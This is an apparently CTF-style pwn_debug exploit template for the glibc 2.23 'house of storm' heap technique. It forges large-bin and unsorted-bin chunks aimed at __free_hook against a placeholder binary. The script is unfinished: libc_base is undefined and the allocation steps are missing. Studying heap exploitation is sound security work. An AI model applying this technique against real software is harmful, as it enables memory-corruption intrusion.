# File: heap_house_of_storm.py
# Author: raycp
# Date: 2019-06-01
# Description: template for house of storm(large bin attack)

from pwn_debug import *


pdbg=pwn_debug("./binary")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")
membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc


def pwn():

	#pdbg.bp([])

	# fake large bin
    free_hook=libc_base+libc.symbols['__free_hook']
    target_out=free_hook-0x10
    fake_bk_nextsize=target_out-5+8-0x20
    fake_bk=target_out+8
    fake_large=p64(0)+p64(0x411)+p64(0)+p64(fake_bk)+p64(0)+p64(fake_bk_nextsize)
    fake_large=fake_large.ljust(0x410,'\x00')

    # fake unsorted bin
    fake_chunk=target_out
    fake_unsorted=p64(0)+p64(0x421)+p64(0)+p64(fake_chunk)
    fake_unsorted=fake_unsorted.ljust(0x420,'\x00')

    # it will malloc out chunk with address of target_out
   
    
    p.interactive() 

if __name__ == '__main__':
    pwn()


